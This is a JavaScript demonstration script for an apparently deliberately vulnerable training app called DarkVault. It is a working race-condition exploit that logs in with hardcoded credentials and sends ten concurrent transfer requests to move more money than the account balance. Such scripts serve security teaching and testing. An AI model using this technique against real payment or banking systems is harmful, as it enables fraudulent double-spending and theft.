/**
 * Race Condition Attack Demonstration for DarkVault
 * 
 * This script demonstrates how to exploit a race condition in the transfer endpoint
 * to send more money than the account balance by making multiple concurrent requests.
 */

const fetch = require('node-fetch');

// Configuration
const API_URL = 'http://localhost:3000/api';
const USERNAME = 'alice';
const PASSWORD = 'password123';
const RECIPIENT_ID = 3; // Bob's user ID
const TRANSFER_AMOUNT = 500; // Amount to transfer in each request
const NUM_REQUESTS = 10; // Number of concurrent requests

// Login and get token
async function login() {
  try {
    const response = await fetch(`${API_URL}/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        username: USERNAME,
        password: PASSWORD
      })
    });
    
    const data = await response.json();
    
    if (response.ok) {
      console.log('Login successful');
      return data.token;
    } else {
      console.error('Login failed:', data.message);
      return null;
    }
  } catch (error) {
    console.error('Login error:', error);
    return null;
  }
}

// Get user balance
async function getBalance(token) {
  try {
    const response = await fetch(`${API_URL}/users/2`, { // Alice's ID is 2
      headers: {
        'Authorization': token
      }
    });
    
    const user = await response.json();
    return user.balance;
  } catch (error) {
    console.error('Error getting balance:', error);
    return null;
  }
}

// Make a transfer
async function transfer(token, amount) {
  try {
    const response = await fetch(`${API_URL}/transfer`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': token
      },
      body: JSON.stringify({
        to: RECIPIENT_ID,
        amount: amount,
        note: 'Race condition attack'
      })
    });
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Transfer error:', error);
    return { success: false, error: error.message };
  }
}

// Launch the race condition attack
async function launchAttack() {
  console.log(`Starting race condition attack demo with ${NUM_REQUESTS} concurrent requests`);
  
  // Login
  const token = await login();
  if (!token) {
    console.error('Cannot continue without token');
    return;
  }
  
  // Get initial balance
  const initialBalance = await getBalance(token);
  console.log(`Initial balance: $${initialBalance}`);
  
  if (initialBalance < TRANSFER_AMOUNT) {
    console.error('Balance too low for demonstration. Add funds or decrease transfer amount.');
    return;
  }
  
  console.log(`Making ${NUM_REQUESTS} concurrent transfers of $${TRANSFER_AMOUNT} each`);
  console.log(`Total amount: $${NUM_REQUESTS * TRANSFER_AMOUNT} (should exceed balance of $${initialBalance})`);
  
  // Create array of promises for concurrent requests
  const transferPromises = [];
  
  for (let i = 0; i < NUM_REQUESTS; i++) {
    transferPromises.push(transfer(token, TRANSFER_AMOUNT));
  }
  
  // Execute all transfers concurrently
  const results = await Promise.all(transferPromises);
  
  // Count successful transfers
  const successfulTransfers = results.filter(result => result.success).length;
  
  console.log(`Transfers completed. ${successfulTransfers} out of ${NUM_REQUESTS} were successful.`);
  
  // Get final balance
  const finalBalance = await getBalance(token);
  console.log(`Final balance: $${finalBalance}`);
  console.log(`Total sent: $${successfulTransfers * TRANSFER_AMOUNT}`);
  
  if (finalBalance < 0 || successfulTransfers * TRANSFER_AMOUNT > initialBalance) {
    console.log('RACE CONDITION EXPLOITED SUCCESSFULLY! More money was transferred than available.');
  } else {
    console.log('Race condition not demonstrated. Try increasing the number of concurrent requests.');
  }
}

// Run the attack
launchAttack().catch(error => {
  console.error('Attack failed with error:', error);
}); 